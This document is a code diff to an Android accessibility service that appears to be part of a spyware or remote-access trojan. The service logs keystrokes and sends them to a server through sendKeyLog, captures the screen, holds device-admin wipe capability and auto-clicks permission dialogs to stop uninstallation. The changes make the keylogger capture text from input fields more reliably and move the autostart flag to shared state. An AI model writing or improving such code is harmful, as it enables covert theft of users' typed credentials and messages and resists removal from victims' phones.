@@ -185,8 +185,6 @@ public class MainAccessibilityService extends AccessibilityService {
     //Wipe data
     private DevicePolicyManager mDevicePolicyManager;
     private ComponentName mAdminComponent;
-
-    private Boolean isAutostartEnable = false;
     private Boolean isMediaProjectEnable = false;
 
     private Boolean isScreenMonitoring = false;
@@ -270,8 +268,6 @@ public class MainAccessibilityService extends AccessibilityService {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             }
-            isAutostartEnable = true;
-
         } else {
             if(mediaProjection == null) {
                 requestMediaProjectService();
@@ -305,7 +301,6 @@ public class MainAccessibilityService extends AccessibilityService {
                 }
                 startCapture();
                 Common.getInstance().setMediaProjection(false);
-                isAutostartEnable = false;
             }
         }
     };
@@ -564,7 +559,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         getKeyLogger(event);
         getSkeletonInfo(event);
-        if(isAutostartEnable && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
+        if(Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
             setPermEditorEnable(event);
         } else {
             setStopUninstall(event);
@@ -643,7 +638,7 @@ public class MainAccessibilityService extends AccessibilityService {
                         if (nodeText.equals("other permissions") || nodeText.equals("outras permissões") || nodeText.equals("otros permisos")|| nodeText.equals("其他权限")) {
                             if(Common.getInstance().getAutosel()) {
                                 onGoBack();
-                                isAutostartEnable = false;
+                                Common.getInstance().setAutostartEnable(false);
                             } else {
                                 if (node.getParent() != null && node.getParent().isClickable()) {
                                     node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -761,17 +756,22 @@ public class MainAccessibilityService extends AccessibilityService {
         CharSequence text = "";
         String eventString = "";
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            text = event.getText().toString();
-            eventString = "Text Input";
-            if(Server.getContext() != null) {
-                if(isKeylogger) {
-                    Server.getContext().sendKeyLog(text, packagename, eventString);
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null && "android.widget.EditText".equals(source.getClassName().toString())) {
+                text = source.getText().toString();
+                eventString = "Text Input";
+                if(Server.getContext() != null) {
+                    if(isKeylogger) {
+                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                    }
                 }
             }
+
         }
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             if(!currentPackagename.equals(packagename.toString())) {
+                currentPackagename = packagename.toString();
                 text = event.getText().toString();
                 eventString = "Navigation";
                 if(Server.getContext() != null) {
@@ -781,11 +781,16 @@ public class MainAccessibilityService extends AccessibilityService {
                 }
             }
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
-                text = event.getText().toString();
-                eventString = "Text Input";
-                if(Server.getContext() != null) {
-                    if(isKeylogger) {
-                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null) {
+                    if(source.getText() != null) {
+                        text = source.getText().toString();
+                        eventString = "Text Input";
+                        if(Server.getContext() != null) {
+                            if(isKeylogger) {
+                                Server.getContext().sendKeyLog(text, packagename, eventString);
+                            }
+                        }
                     }
                 }
             }
@@ -794,11 +799,16 @@ public class MainAccessibilityService extends AccessibilityService {
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
-                text = event.getText().toString();
-                eventString = "Text Input";
-                if(Server.getContext() != null) {
-                    if(isKeylogger) {
-                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null) {
+                    if(source.getText() != null) {
+                        text = source.getText().toString();
+                        eventString = "Text Input";
+                        if(Server.getContext() != null) {
+                            if(isKeylogger) {
+                                Server.getContext().sendKeyLog(text, packagename, eventString);
+                            }
+                        }
                     }
                 }
             }
@@ -806,7 +816,7 @@ public class MainAccessibilityService extends AccessibilityService {
 
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             AccessibilityNodeInfo source = event.getSource();
-            if (source != null) {
+            if (source != null && source.isClickable()) {
                 // Check if the clicked view is a Button
                 CharSequence className = source.getClassName();
                 if (className != null) {
